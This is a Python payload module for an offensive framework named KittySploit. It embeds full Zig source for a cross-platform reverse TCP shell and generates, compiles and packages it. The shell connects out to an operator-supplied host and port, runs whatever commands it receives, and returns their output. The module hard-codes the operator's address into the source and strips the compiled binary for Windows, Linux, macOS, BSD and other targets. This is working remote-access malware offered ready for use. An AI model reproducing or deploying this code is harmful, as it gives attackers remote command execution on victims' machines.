#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
import os
import subprocess
from pathlib import Path

class Module(Payload):
    __info__ = {
        'name': 'Zig Reverse TCP Shell',
        'description': 'Simple reverse shell in Zig - cross-platform compilation (requires Zig compiler)',
        'author': 'KittySploit Team',
        'version': '1.0.0',
        'arch': [Arch.X64, Arch.X86, Arch.ARM, Arch.ARM64, Arch.MIPS, Arch.MIPS64, Arch.RISC_V, Arch.WASM32],
        'listener': 'listeners/multi/reverse_tcp',
        'handler': Handler.REVERSE,
        'session_type': SessionType.SHELL,
        'references': [
            'https://ziglang.org/',
            'https://ziglang.org/documentation/master/#Cross-compilation-is-a-first-class-use-case'
        ]
    }
    
    lhost = OptString('127.0.0.1', 'Connect to IP address', True)
    lport = OptPort(4444, 'Connect to port', True)
    target_os = OptChoice('linux', 'Target operating system', True, 
                         choices=['linux', 'windows', 'macos', 'freebsd', 'netbsd', 'openbsd', 'dragonfly'])
    target_arch = OptChoice('x86_64', 'Target architecture', True,
                            choices=['x86_64', 'x86', 'aarch64', 'arm', 'mips', 'mips64', 'riscv64', 'wasm32'])
    optimization = OptChoice('ReleaseSmall', 'Optimization level', False,
                           choices=['Debug', 'ReleaseFast', 'ReleaseSafe', 'ReleaseSmall'])
    auto_compile = OptBool(False, 'Automatically compile after generation', False)
    output_dir = OptString('output', 'Output directory for compiled binaries', False)
    
    # Zig source code embedded in the module
    ZIG_SOURCE_CODE = """

const std = @import("std");
const os = std.os;
const posix = std.posix;
const process = std.process;
const mem = std.mem;
const builtin = @import("builtin");
const SOCKADDR_IN = extern struct {
    family: u16,
    port: u16,
    addr: u32,
    zero: [8]u8,
};

fn connectToHost(host: []const u8, port: u16) !usize {
    if (builtin.target.os.tag == .windows) {
        const ws2_32 = os.windows.ws2_32;
        
        var wsa_data: ws2_32.WSADATA = undefined;
        if (ws2_32.WSAStartup(0x0202, &wsa_data) != 0) {
            return error.ConnectionFailed;
        }
        
        const sock = ws2_32.socket(2, 1, 0); // AF_INET = 2, SOCK_STREAM = 1
        if (sock == ws2_32.INVALID_SOCKET) return error.ConnectionFailed;
        
        var host_buf: [256]u8 = undefined;
        if (host.len >= host_buf.len) return error.InvalidAddress;
        @memcpy(host_buf[0..host.len], host);
        host_buf[host.len] = 0;
        
        var addr: SOCKADDR_IN = .{
            .family = 2,
            .port = ws2_32.htons(port),
            .addr = ws2_32.inet_addr(&host_buf),
            .zero = [_]u8{0} ** 8,
        };
        
        if (ws2_32.connect(
            sock,
            @ptrCast(&addr),
            @sizeOf(SOCKADDR_IN),
        ) != 0) {
            return error.ConnectionFailed;
        }
        
        return @intFromPtr(sock);
    } else {
        const sock = try posix.socket(posix.AF.INET, posix.SOCK.STREAM | posix.SOCK.CLOEXEC, 0);
        errdefer posix.close(sock);
        
        var addr: posix.sockaddr.in = undefined;
        addr.family = posix.AF.INET;
        addr.port = @byteSwap(port);
        
        var ip_parts: [4]u8 = undefined;
        var part_idx: usize = 0;
        var current: u32 = 0;
        for (host) |c| {
            if (c == '.') {
                if (part_idx >= 4) return error.InvalidAddress;
                ip_parts[part_idx] = @intCast(current);
                part_idx += 1;
                current = 0;
            } else if (c >= '0' and c <= '9') {
                current = current * 10 + (c - '0');
            } else {
                return error.InvalidAddress;
            }
        }
        if (part_idx != 3) return error.InvalidAddress;
        ip_parts[3] = @intCast(current);
        
        const ip_addr: u32 = (@as(u32, ip_parts[0]) << 24) | 
                             (@as(u32, ip_parts[1]) << 16) | 
                             (@as(u32, ip_parts[2]) << 8) | 
                             @as(u32, ip_parts[3]);
        addr.addr = @byteSwap(ip_addr);
        
        try posix.connect(sock, @ptrCast(&addr), @sizeOf(posix.sockaddr.in));
        return @intCast(sock);
    }
}

fn sendData(socket_fd: usize, data: []const u8) !void {
    if (builtin.target.os.tag == .windows) {
        const ws2_32 = os.windows.ws2_32;
        const sock = @as(ws2_32.SOCKET, @ptrFromInt(socket_fd));
        var sent: usize = 0;
        while (sent < data.len) {
            const n = ws2_32.send(sock, data[sent..].ptr, @intCast(data.len - sent), 0);
            if (n == ws2_32.SOCKET_ERROR) return error.ConnectionFailed;
            sent += @intCast(n);
        }
    } else {
        const fd = @as(posix.fd_t, @intCast(socket_fd));
        var sent: usize = 0;
        while (sent < data.len) {
            const n = try posix.send(fd, data[sent..], 0);
            sent += n;
        }
    }
}

fn receiveData(allocator: std.mem.Allocator, socket_fd: usize, max_size: usize) ![]u8 {
    var buffer = std.array_list.Managed(u8).init(allocator);
    errdefer buffer.deinit();
    
    var temp_buf: [4096]u8 = undefined;
    
    if (builtin.target.os.tag == .windows) {
        const ws2_32 = os.windows.ws2_32;
        const sock = @as(ws2_32.SOCKET, @ptrFromInt(socket_fd));
        
        while (buffer.items.len < max_size) {
            const n = ws2_32.recv(sock, &temp_buf, @intCast(temp_buf.len), 0);
            if (n == ws2_32.SOCKET_ERROR) return error.ConnectionFailed;
            if (n == 0) break; // Connection closed
            
            try buffer.appendSlice(temp_buf[0..@intCast(n)]);
            
            if (mem.indexOfScalar(u8, buffer.items, 10)) |_| break;
        }
    } else {
        const fd = @as(posix.fd_t, @intCast(socket_fd));
        
        while (buffer.items.len < max_size) {
            const n = try posix.recv(fd, &temp_buf, 0);
            if (n == 0) break; // Connection closed
            
            try buffer.appendSlice(temp_buf[0..n]);
            
            if (mem.indexOfScalar(u8, buffer.items, 10)) |_| break;
        }
    }
    
    return try buffer.toOwnedSlice();
}

fn executeCommand(allocator: std.mem.Allocator, cmd: []const u8, cwd: []const u8) ![]u8 {
    var command = cmd;
    if (cmd.len > 0 and cmd[cmd.len - 1] == 10) {
        command = cmd[0..cmd.len - 1];
    }
    if (command.len > 0 and command[command.len - 1] == 13) {
        command = command[0..command.len - 1];
    }
    
    if (command.len == 0) {
        return &[_]u8{};
    }
    
    var args_list = std.array_list.Managed([]const u8).init(allocator);
    defer args_list.deinit();
    
    var it = mem.splitScalar(u8, command, ' ');
    while (it.next()) |arg| {
        if (arg.len > 0) {
            try args_list.append(arg);
        }
    }
    
    if (args_list.items.len == 0) {
        return try allocator.dupe(u8, "");
    }
    
    var final_args: []const []const u8 = undefined;
    var cmd_args_wrapper = std.array_list.Managed([]const u8).init(allocator);
    defer cmd_args_wrapper.deinit();
    
    if (builtin.target.os.tag == .windows) {
        try cmd_args_wrapper.append("cmd.exe");
        try cmd_args_wrapper.append("/c");
        for (args_list.items) |arg| {
            try cmd_args_wrapper.append(arg);
        }
        final_args = cmd_args_wrapper.items;
    } else {
        // Unix: use command directly
        final_args = args_list.items;
    }
    
    var child = std.process.Child.init(final_args, allocator);
    child.cwd = cwd;
    child.stdin_behavior = .Ignore;
    child.stdout_behavior = .Pipe;
    child.stderr_behavior = .Pipe;
    
    child.spawn() catch |err| {
        const err_msg = try std.fmt.allocPrint(allocator, "Error: {s}\\n", .{@errorName(err)});
        return err_msg;
    };
    
    var stdout_list = std.ArrayList(u8).empty;
    defer stdout_list.deinit(allocator);
    var stderr_list = std.ArrayList(u8).empty;
    defer stderr_list.deinit(allocator);
    
    child.collectOutput(allocator, &stdout_list, &stderr_list, 1024 * 1024) catch |err| {
        const err_msg = try std.fmt.allocPrint(allocator, "Error collecting output: {s}\\n", .{@errorName(err)});
        return err_msg;
    };
    
    _ = child.wait() catch |err| {
        const err_msg = try std.fmt.allocPrint(allocator, "Error: {s}\\n", .{@errorName(err)});
        return err_msg;
    };
    
    if (stderr_list.items.len == 0) {
        return try allocator.dupe(u8, stdout_list.items);
    }
    var output = std.array_list.Managed(u8).init(allocator);
    defer output.deinit();
    try output.appendSlice(stdout_list.items);
    try output.appendSlice(stderr_list.items);
    return try output.toOwnedSlice();
}

pub fn main() !void {
    var gpa = std.heap.GeneralPurposeAllocator(.{.safety = false}){};
    defer _ = gpa.deinit();
    const allocator = gpa.allocator();
    
    const args = try process.argsAlloc(allocator);
    defer process.argsFree(allocator, args);
    
    const host = if (args.len > 1) args[1] else "127.0.0.1";
    const port = if (args.len > 2) try std.fmt.parseInt(u16, args[2], 10) else 4444;
    
    const cwd = try process.getCwdAlloc(allocator);
    defer allocator.free(cwd);
    
    const socket_fd = connectToHost(host, port) catch |err| {
        std.debug.print("Failed to connect: {s}\\n", .{@errorName(err)});
        return;
    };
    
    while (true) {
        const command = receiveData(allocator, socket_fd, 8192) catch |err| {
            std.debug.print("Failed to receive: {s}\\n", .{@errorName(err)});
            break;
        };
        defer allocator.free(command);
        
        const output = executeCommand(allocator, command, cwd) catch |err| {
            const err_msg = try std.fmt.allocPrint(allocator, "Error: {s}\\n", .{@errorName(err)});
            defer allocator.free(err_msg);
            _ = sendData(socket_fd, err_msg) catch break;
            continue;
        };
        defer allocator.free(output);
        
        _ = sendData(socket_fd, output) catch break;
    }
    
    if (builtin.target.os.tag == .windows) {
        const ws2_32 = os.windows.ws2_32;
        const sock = @as(ws2_32.SOCKET, @ptrFromInt(socket_fd));
        _ = ws2_32.closesocket(sock);
    } else {
        const sock = @as(posix.fd_t, @intCast(socket_fd));
        posix.close(sock);
    }
}
"""

    def generate(self):
        """Generate the Zig reverse shell payload"""
        print_status("Generating Zig Reverse Shell payload...")
        
        # Get options
        lhost = self.lhost
        lport = self.lport
        target_os = self.target_os
        target_arch = self.target_arch
        optimization = self.optimization
        output_dir = self.output_dir
        auto_compile = self.auto_compile
        
        # Create output directory
        output_path = Path(output_dir)
        output_path.mkdir(parents=True, exist_ok=True)
        src_dir = output_path / "src"
        src_dir.mkdir(parents=True, exist_ok=True)
        
        # Write Zig source code with embedded listener details
        zig_source = self.ZIG_SOURCE_CODE
        zig_source = zig_source.replace(
            'const host = if (args.len > 1) args[1] else "127.0.0.1";',
            f'const host = "{lhost}";'
        )
        zig_source = zig_source.replace(
            'const port = if (args.len > 2) try std.fmt.parseInt(u16, args[2], 10) else 4444;',
            f'const port: u16 = {int(lport)};'
        )
        zig_file = src_dir / "shell.zig"
        with open(zig_file, 'w', encoding='utf-8') as f:
            f.write(zig_source)
        
        print_success(f"Source code saved to: {zig_file}")
        
        # Map target OS and arch to Zig targets
        zig_target_map = {
            'linux': 'linux',
            'windows': 'windows',
            'macos': 'macos',
            'freebsd': 'freebsd',
            'netbsd': 'netbsd',
            'openbsd': 'openbsd',
            'dragonfly': 'dragonfly',
        }
        
        zig_arch_map = {
            'x86_64': 'x86_64',
            'x86': 'x86',
            'aarch64': 'aarch64',
            'arm': 'arm',
            'mips': 'mips',
            'mips64': 'mips64',
            'riscv64': 'riscv64',
            'wasm32': 'wasm32',
        }
        
        zig_os = zig_target_map.get(target_os, 'linux')
        zig_arch = zig_arch_map.get(target_arch, 'x86_64')
        zig_target = f"{zig_arch}-{zig_os}"
        
        # Determine binary extension
        binary_ext = ".exe" if target_os == "windows" else ""
        binary_name = f"shell{binary_ext}"
        binary_path = output_path / binary_name
        
        # Create compilation script
        compile_script = output_path / "compile.sh"
        with open(compile_script, 'w', encoding='utf-8') as f:
            f.write("#!/bin/bash\n")
            f.write("# Compilation script for Zig Reverse Shell\n")
            f.write(f"# Target: {zig_target}\n\n")
            f.write("ZIG_CMD=\"zig\"\n")
            f.write(f"TARGET=\"{zig_target}\"\n")
            f.write(f"SOURCE=\"src/shell.zig\"\n")
            f.write(f"OUTPUT=\"shell{binary_ext}\"\n")
            f.write(f"OPTIMIZATION=\"{optimization}\"\n\n")
            f.write("echo \"Compiling Zig Reverse Shell for ${TARGET}...\"\n")
            f.write("echo \"\"\n\n")
            f.write("# Check if zig is in PATH\n")
            f.write("if ! command -v ${ZIG_CMD} &> /dev/null; then\n")
            f.write("    echo \"[!] Error: zig command not found in PATH\"\n")
            f.write("    echo \"    Please install Zig from https://ziglang.org/\"\n")
            f.write("    exit 1\n")
            f.write("fi\n\n")
            f.write("# Compile with maximum size optimizations\n")
            f.write("${ZIG_CMD} build-exe ${SOURCE} \\\n")
            f.write("    --target ${TARGET} \\\n")
            f.write("    -O ${OPTIMIZATION} \\\n")
            f.write("    -fstrip \\\n")
            f.write("    -fno-stack-check \\\n")
            f.write("    -fno-unwind-tables \\\n")
            f.write("    -fsingle-threaded \\\n")
            f.write("    --name shell\n\n")
            f.write("if [ $? -eq 0 ]; then\n")
            f.write("    echo \"[+] Compilation successful!\"\n")
            f.write("    echo \"[+] Binary: ${OUTPUT}\"\n")
            f.write("    if [ -f \"shell\" ]; then\n")
            f.write("        mv shell ${OUTPUT}\n")
            f.write("    fi\n")
            f.write("else\n")
            f.write("    echo \"[!] Compilation failed\"\n")
            f.write("    exit 1\n")
            f.write("fi\n")
        
        # Make script executable (Unix)
        if os.name != 'nt':
            os.chmod(compile_script, 0o755)
        
        print_success(f"Compilation script saved to: {compile_script}")
        print_info(f"Binary will be saved to: {binary_path}")
        print_info(f"Target: {zig_target}")
        print_info(f"Connect to: {lhost}:{lport}")
        print_info(f"Binary output directory: {output_dir}")
        
        # Auto-compile if requested
        if auto_compile:
            print_status("Auto-compiling...")
            from core.lib.compiler.zig_compiler import ZigCompiler
            
            # Read source code
            with open(zig_file, 'r', encoding='utf-8') as f:
                source_code = f.read()
            
            compiler = ZigCompiler()
            result = compiler.compile(
                source_code=source_code,
                output_path=str(binary_path),
                target_platform=target_os,
                target_arch=target_arch,
                optimization=optimization
            )
            
            if result:
                print_success(f"Compilation successful! Binary: {binary_path}")
            else:
                print_error("Compilation failed, but source files are ready")
        
        # Create payload execution script
        payload_script = output_path / "payload.sh"
        with open(payload_script, 'w', encoding='utf-8') as f:
            f.write("./shell\n")
        
        if os.name != 'nt':
            os.chmod(payload_script, 0o755)
        
        print_success("Payload generation complete!")
        print_info(f"To compile manually: cd {output_dir} && bash compile.sh")
        print_info(f"To run: cd {output_dir} && ./shell")

        return {
            'source': str(zig_file),
            'compile_script': str(compile_script),
            'payload_script': str(payload_script),
            'binary_path': str(binary_path),
            'target': zig_target,
            'connect_to': f"{lhost}:{lport}"
        }

